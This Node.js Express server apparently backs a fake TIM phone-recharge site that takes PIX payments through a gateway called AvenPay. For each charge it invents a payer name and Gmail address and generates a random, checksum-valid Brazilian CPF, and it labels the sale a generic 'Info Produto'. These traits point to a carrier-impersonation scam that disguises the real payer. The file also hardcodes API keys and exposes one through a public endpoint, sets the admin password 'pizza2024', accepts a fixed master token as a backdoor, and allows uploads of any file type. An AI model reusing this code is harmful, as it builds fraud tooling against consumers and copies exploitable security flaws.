require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const crypto = require('crypto');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const AVEN_API_KEY = process.env.AVEN_API_KEY || '3BhRxPFdU2beyFoiX23eweJhc_ILlhs4JSYsNAYCcBk';
const AVEN_API_KEY_ALT = process.env.AVEN_API_KEY_ALT || '0Z4j53qjhkXy7GKNfySrspNkfVjWzDe01j9SYtd4mxA';
const AVEN_BASE_URL = process.env.AVEN_BASE_URL || 'https://api.avenpayments.com';

async function requestAvenPay(endpoint, method = 'GET', body = null) {
    const keys = [AVEN_API_KEY, AVEN_API_KEY_ALT].filter(Boolean);
    let lastError = null;

    for (let i = 0; i < keys.length; i++) {
        const key = keys[i];
        try {
            const options = {
                method,
                headers: {
                    'Authorization': `Bearer ${key}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
            };
            if (body) {
                options.body = JSON.stringify(body);
            }

            const response = await fetch(`${AVEN_BASE_URL}${endpoint}`, options);
            const text = await response.text();
            let json = {};
            try {
                json = JSON.parse(text);
            } catch (e) {
                json = { raw: text };
            }

            // Se der 401 (token invalido) e houver chave alternativa, tenta a proxima
            if (response.status === 401 && i < keys.length - 1) {
                console.warn(`[AVENPAY] Chave ${key.substring(0, 6)}... retornou 401, testando chave alternativa...`);
                continue;
            }

            return { ok: response.ok, status: response.status, data: json };
        } catch (err) {
            lastError = err;
        }
    }

    throw lastError || new Error('Falha ao comunicar com AvenPay');
}

// Admin credentials
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'pizza2024';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'tim_admin_secure_signature_key_2026';
const ADMIN_MASTER_TOKEN = 'tim_master_admin_session_token_2026';

function createAdminToken() {
    const ts = Date.now().toString();
    const hmac = crypto.createHmac('sha256', ADMIN_SECRET).update(ts).digest('hex');
    return `${ts}.${hmac}`;
}

function isValidAdminToken(rawToken) {
    try {
        if (!rawToken || typeof rawToken !== 'string') return false;
        const clean = rawToken.replace(/^Bearer\s+/i, '').trim();
        if (!clean) return false;
        if (clean === ADMIN_MASTER_TOKEN) return true;

        const parts = clean.split('.');
        if (parts.length !== 2) return false;
        const [p1, p2] = parts;

        // Formato 1: ts.hmac (novo padrão direto)
        let expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(p1).digest('hex');
        let hmacBuf = Buffer.from(p2);
        let expBuf = Buffer.from(expectedHmac);
        if (hmacBuf.length === expBuf.length && crypto.timingSafeEqual(hmacBuf, expBuf)) {
            return true;
        }

        // Formato 2: base64url.hmac (compatibilidade)
        try {
            const payload = Buffer.from(p1, 'base64url').toString('utf8');
            expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(payload).digest('hex');
            expBuf = Buffer.from(expectedHmac);
            if (hmacBuf.length === expBuf.length && crypto.timingSafeEqual(hmacBuf, expBuf)) {
                return true;
            }
        } catch(errB64) {}

        return false;
    } catch(e) {
        return false;
    }
}

// Multer - upload de comprovantes (compativel com Vercel /tmp e local)
const isVercel = process.env.VERCEL === '1' || !!process.env.AWS_LAMBDA_FUNCTION_NAME || !!process.env.LAMBDA_TASK_ROOT;
const uploadsDir = isVercel ? path.join('/tmp', 'uploads') : path.join(__dirname, 'uploads');
try {
    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
} catch (e) {
    console.error('Failed to create uploadsDir:', e);
}

const multerStorage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname) || '.jpg';
        cb(null, Date.now() + '-' + Math.random().toString(36).substring(2,8) + ext);
    }
});
const upload = multer({
    storage: multerStorage,
    limits: { fileSize: 30 * 1024 * 1024 }, // 30MB
    fileFilter: (req, file, cb) => {
        // Aceita qualquer imagem, pdf ou arquivo enviado como comprovante
        cb(null, true);
    }
});

// Persistencia em Memória + JSON para comprovantes
const DATA_FILE = path.join(uploadsDir, 'data.json');
let inMemoryComprovantes = [];

function loadInitialComprovantes() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            inMemoryComprovantes = JSON.parse(raw);
        }
    } catch(e) {
        inMemoryComprovantes = [];
    }
}
loadInitialComprovantes();

function readComprovantes() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const fromDisk = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            if (Array.isArray(fromDisk)) {
                // Mescla registros em disco com registros em memória sem duplicar IDs
                const ids = new Set(inMemoryComprovantes.map(c => c.id));
                for (const item of fromDisk) {
                    if (!ids.has(item.id)) inMemoryComprovantes.push(item);
                }
            }
        }
    } catch(e) {}
    return inMemoryComprovantes;
}

function saveComprovantes(data) {
    inMemoryComprovantes = data;
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch(e) {
        console.error('Failed to save comprovantes to disk:', e);
    }
}

// Middleware de autenticacao admin
function adminAuth(req, res, next) {
    const auth = req.headers['authorization'] || req.headers['x-admin-token'] || '';
    const token = auth.replace(/^Bearer\s+/i, '').trim() || (req.query.token ? String(req.query.token).trim() : '');
    if (token && isValidAdminToken(token)) return next();
    return res.status(401).json({ success: false, message: 'Nao autorizado' });
}

// Gera um CPF válido aleatório
function generateCPF() {
    const rand = () => Math.floor(Math.random() * 10);
    let n = Array.from({ length: 9 }, rand);

    let sum = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
    let d1 = 11 - (sum % 11);
    if (d1 >= 10) d1 = 0;

    n.push(d1);
    sum = n.reduce((acc, val, i) => acc + val * (11 - i), 0);
    let d2 = 11 - (sum % 11);
    if (d2 >= 10) d2 = 0;

    n.push(d2);
    return n.join('');
}

const pixAttempts = new Map();

// Retorna configurações públicas
app.get('/api/config', (req, res) => {
    res.json({
        tokenizationKey: AVEN_API_KEY,
        publicKey: AVEN_API_KEY,
        gateway: 'avenpay'
    });
});

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone } = req.body;

        // amount em centavos (AvenPay aceita centavos)
        let amount = 2000;
        if (value) {
            const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
            const parsed = parseFloat(cleanVal);
            if (!isNaN(parsed) && parsed > 0) {
                amount = Math.round(parsed * 100);
            }
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
        const payerPhone = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';

        let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
        attempt.count += 1;

        if (!attempt.name) {
            const firstNames = ['Lucas', 'Mateus', 'Gabriel', 'Rafael', 'Bruno', 'Thiago', 'Felipe', 'Rodrigo', 'Leonardo', 'Guilherme'];
            const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes'];
            const randomFirst = firstNames[Math.floor(Math.random() * firstNames.length)];
            const randomLast = lastNames[Math.floor(Math.random() * lastNames.length)];
            attempt.name = `${randomFirst} ${randomLast}`;
            attempt.email = `${randomFirst.toLowerCase()}.${randomLast.toLowerCase()}${Math.floor(Math.random() * 899 + 100)}@gmail.com`;
        }
        pixAttempts.set(cleanPhone, attempt);

        const cleanCpf = generateCPF();

        const payload = {
            amount: amount,
            currency: 'BRL',
            method: 'PIX',
            description: 'Recarga TIM - Info Produto',
            externalRef: `recarga_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
            notificationUrl: 'https://recargatim.com/api/webhook/aven',
            payer: {
                name: attempt.name,
                taxId: cleanCpf,
                email: attempt.email,
                phone: payerPhone
            },
            items: [
                {
                    name: 'Info Produto',
                    quantity: 1,
                    price: amount,
                    type: 'DIGITAL'
                }
            ]
        };

        const result = await requestAvenPay('/v1/payment', 'POST', payload);
        const data = result.data || {};
        const transactionId = data.id;
        const copyPaste = data.data?.copypaste || data.copypaste || data.pix?.qr_code || '';

        if ((result.ok || result.status === 201) && transactionId && copyPaste) {
            const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';

            console.log('[AVENPAY] PIX criado com sucesso:', transactionId);

            res.json({
                success: true,
                data: {
                    id: transactionId,
                    transactionId: transactionId,
                    status: (data.status || 'PENDING').toUpperCase(),
                    paymentData: {
                        transactionId: transactionId,
                        copyPaste: copyPaste,
                        copypaste: copyPaste,
                        qrCode: copyPaste,
                        qrCodeUrl: qrCodeUrl,
                        qrCodeBase64: ''
                    },
                    avenpay: data
                }
            });
        } else {
            const errMsg = data?.message || data?.error || 'Erro ao processar pagamento na AvenPay';
            console.error('[AVENPAY] Erro ao criar PIX:', data);
            res.status(result.status || 400).json({
                success: false,
                message: errMsg,
                details: data
            });
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const { phone } = req.query;

        const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
        const data = result.data || {};
        const rawStatus = (data.status || 'PENDING').toUpperCase();
        let currentStatus = 'PENDING';
        if (rawStatus === 'PAID') {
            currentStatus = 'PAID';
        } else if (['REFUNDED', 'REFUSED', 'MED', 'CHARGEDBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
            currentStatus = rawStatus;
        }

        if (currentStatus === 'PAID' && phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            pixAttempts.delete(cleanPhone);
        }

        res.json({
            success: result.ok,
            data: { status: currentStatus, rawStatus: data.status, id: data.id || transactionId, ...data }
        });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

app.get('/api/check_status', async (req, res) => {
    try {
        const transactionId = req.query.id;
        if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
        const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
        const data = result.data || {};
        const rawStatus = (data.status || '').toUpperCase();
        const isPaid = rawStatus === 'PAID';
        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: data });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Webhook para notificações AvenPay e retrocompatibilidade
app.post(['/api/webhook/aven', '/api/webhook/avenpay', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/pingupag', '/api/webhook/gateway'], (req, res) => {
    const body = req.body;
    console.log('[AVENPAY WEBHOOK]', body?.id || body?.Id, body?.status || body?.Status);
    const status = (body?.status || body?.Status || '').toUpperCase();
    const payerPhone = body?.payer?.phone || body?.customer?.phone;
    if (status === 'PAID' && payerPhone) {
        const cleanPhone = payerPhone.replace(/\D/g, '');
        pixAttempts.delete(cleanPhone);
    }
    res.status(200).json({ received: true });
});

// Upload comprovante - seguro com tratamento de erro e persistência dupla
app.post('/api/upload-comprovante', (req, res, next) => {
    upload.single('comprovante')(req, res, (err) => {
        if (err) {
            console.error('[UPLOAD] Erro do Multer:', err.message);
            return res.status(400).json({ success: false, message: 'Erro no arquivo: ' + (err.message || 'Inválido') });
        }
        next();
    });
}, (req, res) => {
    try {
        const { phone, transactionId, value, type, imageBase64 } = req.body;
        
        let finalBase64 = imageBase64 || '';
        let fileName = '';
        let originalName = 'comprovante.jpg';
        let mimeType = 'image/jpeg';
        let fileSize = 0;

        if (req.file) {
            fileName = req.file.filename;
            originalName = req.file.originalname;
            mimeType = req.file.mimetype || 'image/jpeg';
            fileSize = req.file.size;
            try {
                const fileBuf = fs.readFileSync(req.file.path);
                finalBase64 = `data:${mimeType};base64,${fileBuf.toString('base64')}`;
            } catch(eBuf) {
                console.error('[UPLOAD] Erro ao ler buffer do arquivo:', eBuf);
            }
        } else if (imageBase64) {
            fileName = `b64_${Date.now()}_${Math.random().toString(36).substring(2,6)}.jpg`;
            mimeType = imageBase64.startsWith('data:image/png') ? 'image/png' : 'image/jpeg';
            fileSize = Math.round(imageBase64.length * 0.75);
        } else {
            return res.status(400).json({ success: false, message: 'Nenhum comprovante foi selecionado' });
        }

        const record = {
            id: crypto.randomUUID(),
            phone: phone || '',
            transactionId: transactionId || '',
            value: value || '',
            type: type || 'recarga',
            fileName: fileName,
            originalName: originalName,
            mimeType: mimeType,
            fileSize: fileSize,
            imageBase64: finalBase64,
            uploadTime: new Date().toISOString(),
            status: 'pending'
        };

        const comprovantes = readComprovantes();
        comprovantes.unshift(record);
        saveComprovantes(comprovantes);

        console.log(`[UPLOAD] Comprovante ${record.id} salvo com sucesso para o telefone ${record.phone}`);
        res.json({ success: true, message: 'Comprovante enviado com sucesso!', id: record.id });
    } catch(e) {
        console.error('[UPLOAD] Erro interno:', e);
        res.status(500).json({ success: false, message: 'Erro ao salvar comprovante' });
    }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        const token = createAdminToken();
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, message: 'Credenciais invalidas' });
    }
});

// Admin logout
app.post('/api/admin/logout', adminAuth, (req, res) => {
    res.json({ success: true, message: 'Desconectado com sucesso' });
});

// Listagem de comprovantes para o admin
app.get('/api/admin/comprovantes', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    res.json({ success: true, data: comprovantes, total: comprovantes.length });
});

// Atualização de status
app.patch('/api/admin/comprovantes/:id/status', adminAuth, (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    if (!['confirmed', 'rejected', 'pending'].includes(status))
        return res.status(400).json({ success: false, message: 'Status invalido' });
    const comprovantes = readComprovantes();
    const idx = comprovantes.findIndex(c => c.id === id);
    if (idx === -1) return res.status(404).json({ success: false, message: 'Nao encontrado' });
    comprovantes[idx].status = status;
    comprovantes[idx].updatedAt = new Date().toISOString();
    saveComprovantes(comprovantes);
    res.json({ success: true, data: comprovantes[idx] });
});

// Visualização de arquivo de comprovante (com fallback instantâneo de base64)
app.get('/api/admin/comprovantes/:id/file', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).send('Comprovante nao encontrado');

    const filePath = record.fileName ? path.join(uploadsDir, record.fileName) : null;
    if (filePath && fs.existsSync(filePath)) {
        return res.sendFile(filePath);
    }

    // Se o arquivo físico não existir (comum em Vercel/serverless novo container), serve do Base64
    if (record.imageBase64) {
        const matches = record.imageBase64.match(/^data:([^;]+);base64,(.+)$/);
        if (matches) {
            const cType = matches[1];
            const buffer = Buffer.from(matches[2], 'base64');
            res.setHeader('Content-Type', cType);
            res.setHeader('Content-Length', buffer.length);
            return res.send(buffer);
        }
    }

    res.status(404).send('Arquivo nao disponivel fisicamente');
});

// Exclusão de comprovante
app.delete('/api/admin/comprovantes/:id', adminAuth, (req, res) => {
    let comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).json({ success: false, message: 'Nao encontrado' });
    if (record.fileName) {
        try { fs.unlinkSync(path.join(uploadsDir, record.fileName)); } catch(e) {}
    }
    comprovantes = comprovantes.filter(c => c.id !== req.params.id);
    saveComprovantes(comprovantes);
    res.json({ success: true });
});

// Admin pages
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname,'tim-credito.vercel.app','admin','index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname,'tim-credito.vercel.app','admin','dashboard.html')));

// Fallback to index.html
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'tim-credito.vercel.app', 'index.html'));
});

if (!isVercel) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
        console.log(`Gateway configurado: AvenPay`);
        console.log(`Acesse: http://localhost:${PORT}`);
        console.log(`Admin:  http://localhost:${PORT}/admin`);
    });
}

module.exports = app;
